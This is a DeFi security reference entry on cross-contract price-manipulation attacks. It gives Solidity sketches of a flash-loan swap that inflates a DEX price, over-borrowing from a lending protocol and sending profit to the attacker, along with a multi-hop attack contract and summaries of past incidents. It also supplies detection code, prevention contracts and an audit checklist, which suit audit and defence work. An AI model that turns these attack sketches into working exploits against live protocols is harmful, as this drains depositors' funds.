---
id: ATTACK-CHAIN-CROSS-CONTRACT
title: Cross-Contract Manipulation Attack Chain
category: attack-chains
difficulty: advanced
tags: [cross-contract, composability, oracle, lending, cascade]
real_exploits: [cream-2021, harvest-2020, venus-2021]
typical_loss: $50M-130M
last_updated: 2026-01-31
---

# Cross-Contract Manipulation Attack Chain

## Overview

This attack chain exploits the composability of DeFi by manipulating one protocol to affect another. The attacker uses Protocol A's mechanisms to create conditions that exploit Protocol B.

## Attack Flow Diagram

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ Manipulate   │ ─▶ │ Protocol B   │ ─▶ │ Exploit B's  │ ─▶ │ Extract      │
│ Protocol A   │    │ Reads A's    │    │ Wrong View   │    │ Value        │
│ (Oracle/DEX) │    │ State        │    │ of Reality   │    │              │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
```

## Prerequisites

- **Protocol composability** - B depends on A's state
- **Manipulable Protocol A** - Can influence A's externally-visible state
- **Vulnerable Protocol B** - Trusts A's state without validation
- **Economic incentive** - Manipulation is profitable

## Attack Steps

### Step 1: Identify the Dependency Chain

```solidity
// Protocol B (Lending) depends on Protocol A (DEX) for pricing
contract LendingProtocolB {
    IDex public protocolA;  // Uniswap, Curve, etc.
    
    function getCollateralValue(address token, uint256 amount) 
        public view returns (uint256) 
    {
        // Reads price from Protocol A
        uint256 price = protocolA.getSpotPrice(token);
        return amount * price / 1e18;
    }
    
    function borrow(address collateral, uint256 collateralAmount) external {
        uint256 collateralValue = getCollateralValue(collateral, collateralAmount);
        uint256 maxBorrow = collateralValue * ltv / 100;
        // ... borrow logic
    }
}
```

**Dependency Identified**: Lending uses DEX spot price

### Step 2: Manipulate Protocol A

```solidity
function manipulateProtocolA() internal {
    // Flash loan large amount
    uint256 loanAmount = 50_000_000e6;  // $50M
    
    // Swap to move price in Protocol A (DEX)
    IRouter(dexRouter).swapExactTokensForTokens(
        loanAmount,
        0,
        [USDC, TARGET_TOKEN],
        address(this),
        block.timestamp
    );
    
    // TARGET_TOKEN price is now artificially HIGH in Protocol A
}
```

**State Change**: Protocol A's observable state is manipulated

### Step 3: Exploit Protocol B

```solidity
function exploitProtocolB() internal {
    // Protocol B sees inflated price from Protocol A
    
    // Deposit small amount of TARGET_TOKEN as collateral
    uint256 depositAmount = 1000e18;  // 1000 tokens
    ILending(protocolB).deposit(TARGET_TOKEN, depositAmount);
    
    // Borrow maximum against inflated collateral value
    // Real value: $10,000
    // Perceived value: $1,000,000 (inflated 100x)
    uint256 maxBorrow = ILending(protocolB).getMaxBorrow(address(this));
    
    ILending(protocolB).borrow(USDC, maxBorrow);
    // Borrowed $800,000 against $10,000 collateral!
}
```

**State Change**: Extracted excess value from Protocol B

### Step 4: Unwind and Profit

```solidity
function unwindAndProfit() internal {
    // Swap back to restore prices (optional, arbitrageurs do this anyway)
    uint256 tokenBalance = IERC20(TARGET_TOKEN).balanceOf(address(this));
    
    IRouter(dexRouter).swapExactTokensForTokens(
        tokenBalance,
        0,
        [TARGET_TOKEN, USDC],
        address(this),
        block.timestamp
    );
    
    // Repay flash loan
    IERC20(USDC).transfer(flashLender, loanAmount + fee);
    
    // Keep profit
    // Profit = Borrowed from B - Flash loan cost - Original collateral value
    uint256 profit = IERC20(USDC).balanceOf(address(this));
    IERC20(USDC).transfer(attacker, profit);
}
```

## Complex Cross-Contract Chain Example

```solidity
// Multi-hop attack: DEX → Yield Vault → Lending → Liquidation

contract ComplexCrossContractAttack {
    function execute() external {
        // Step 1: Flash loan
        IFlashLender(aave).flashLoan(address(this), USDC, 50_000_000e6, "");
    }
    
    function executeOperation(...) external {
        // Step 2: Manipulate Curve pool to inflate LP token price
        ICurve(curvePool).exchange(0, 1, 25_000_000e6, 0);
        
        // Curve LP virtual_price is now inflated
        
        // Step 3: Yield vault uses Curve LP as collateral
        // Its valuation is now wrong
        
        // Step 4: Lending protocol uses yield vault shares as collateral
        // Values yield vault shares based on inflated virtual_price
        ILending(lending).deposit(vaultShares, vaultShareAmount);
        
        // Step 5: Borrow against inflated collateral
        uint256 borrowed = ILending(lending).borrowMax(USDC);
        
        // Step 6: Some positions become liquidatable due to price move
        address[] memory liquidatable = findLiquidatable();
        for (uint i = 0; i < liquidatable.length; i++) {
            ILending(lending).liquidate(liquidatable[i]);
        }
        
        // Step 7: Restore Curve price
        ICurve(curvePool).exchange(1, 0, remaining, 0);
        
        // Step 8: Repay flash loan, keep profit
        IERC20(USDC).transfer(aave, 50_000_000e6 + fee);
    }
}
```

## Real-World Examples

### Cream Finance (Oct 2021) - $130M

```
Cross-Contract Chain:
1. Attacker controlled crYUSD market
2. Manipulated yUSD price via yVault
3. Cream used yUSD as collateral
4. Deposited inflated yUSD
5. Borrowed all available assets

Dependency: Cream → Yearn → Curve
```

### Harvest Finance (Oct 2020) - $34M

```
Cross-Contract Chain:
1. Flash loaned $50M USDC
2. Swapped in Curve to move USDC/USDT ratio
3. Deposited USDC into Harvest fUSDC vault at favorable rate
4. Swapped back in Curve
5. Withdrew from Harvest at new (bad for vault) rate
6. Repeated 17 times

Dependency: Harvest → Curve
```

### Venus Protocol (May 2021) - $77M

```
Cross-Contract Chain:
1. Manipulated XVS price via low-liquidity pairs
2. Venus oracle used manipulated price
3. Used XVS as collateral at inflated value
4. Borrowed $77M against inflated XVS
5. XVS price returned to normal, loans underwater

Dependency: Venus → DEX Oracles
```

## Detection Points

| Step | Detection Signal | Monitoring |
|------|-----------------|------------|
| 1 | Large price movement | DEX monitoring |
| 2 | Unusual dependency read | Cross-protocol alerts |
| 3 | Extreme collateral values | Sanity bounds |
| 4 | Large extractions | Withdrawal limits |

```solidity
// Detection: Cross-protocol sanity check
contract CrossProtocolMonitor {
    mapping(address => uint256) public lastKnownPrice;
    uint256 public constant MAX_DEVIATION = 10;  // 10%
    
    function validateCrossProtocolState(
        address token,
        address[] memory protocols
    ) public view returns (bool) {
        uint256[] memory prices = new uint256[](protocols.length);
        
        for (uint i = 0; i < protocols.length; i++) {
            prices[i] = IProtocol(protocols[i]).getPrice(token);
        }
        
        // All protocols should agree within tolerance
        for (uint i = 1; i < prices.length; i++) {
            uint256 deviation = calculateDeviation(prices[0], prices[i]);
            if (deviation > MAX_DEVIATION) {
                return false;  // Cross-protocol mismatch!
            }
        }
        
        return true;
    }
}
```

## Prevention Measures

### For Protocol B (Consumer)

```solidity
contract SecureLending {
    // Don't trust single source
    mapping(address => address[]) public priceFeeds;
    
    function getPrice(address token) public view returns (uint256) {
        address[] memory feeds = priceFeeds[token];
        require(feeds.length >= 2, "Need multiple sources");
        
        uint256[] memory prices = new uint256[](feeds.length);
        for (uint i = 0; i < feeds.length; i++) {
            prices[i] = IOracle(feeds[i]).getPrice(token);
        }
        
        // Check consensus
        uint256 medianPrice = getMedian(prices);
        for (uint i = 0; i < prices.length; i++) {
            uint256 deviation = abs(prices[i] - medianPrice) * 100 / medianPrice;
            require(deviation <= 5, "Price feed divergence");
        }
        
        return medianPrice;
    }
    
    // Use TWAP instead of spot
    function getTWAPPrice(address token) public view returns (uint256) {
        return ITwapOracle(twapOracle).consult(token, 30 minutes);
    }
    
    // Bound acceptable prices
    uint256 public constant MAX_PRICE_CHANGE = 20;  // 20% per hour
    
    function validatePriceChange(address token, uint256 newPrice) internal view {
        uint256 lastPrice = lastRecordedPrice[token];
        uint256 change = abs(newPrice - lastPrice) * 100 / lastPrice;
        require(change <= MAX_PRICE_CHANGE, "Price change too large");
    }
}
```

### For Protocol A (Source)

```solidity
contract SecureDEX {
    // Make manipulation expensive
    function getPrice(address token) external view returns (uint256) {
        // Return TWAP, not spot
        return _getTWAP(token, 30 minutes);
    }
    
    // Or add manipulation cost
    function swap(...) external {
        // Large swaps require time delay
        if (amountIn > largeSwapThreshold) {
            pendingSwaps[swapId] = SwapRequest(...);
            pendingSwaps[swapId].executeAfter = block.timestamp + 1 hours;
            return;
        }
        
        _executeSwap(...);
    }
}
```

## Audit Checklist

```
[ ] What external protocols does this protocol depend on?
[ ] How does it consume external protocol state?
[ ] Can that external state be manipulated?
[ ] Is there price validation across sources?
[ ] Are TWAPs used instead of spot prices?
[ ] Are there circuit breakers for extreme values?
[ ] What's the cascade risk if dependency is exploited?
[ ] Are there time delays for large operations?
```

## Dependency Mapping Template

When auditing, map all external dependencies:

```
Protocol Under Audit: LendingProtocolX

Dependencies:
├── Price Oracles
│   ├── Chainlink (LOW risk - decentralized)
│   ├── Uniswap TWAP (MEDIUM risk - can be manipulated over time)
│   └── Curve spot (HIGH risk - flash loan manipulable)
│
├── Collateral Tokens
│   ├── USDC (LOW risk - stable, centralized)
│   ├── stETH (MEDIUM risk - peg risk)
│   └── Curve LP (HIGH risk - virtual_price manipulation)
│
└── Integrations
    ├── Yearn Vaults (MEDIUM risk - strategy risk)
    └── Convex (MEDIUM risk - CVX token risk)

Highest Risk Paths:
1. Curve spot oracle → collateral valuation → over-borrowing
2. Curve LP virtual_price → collateral valuation → over-borrowing
3. Yearn vault share price → collateral valuation → over-borrowing
```
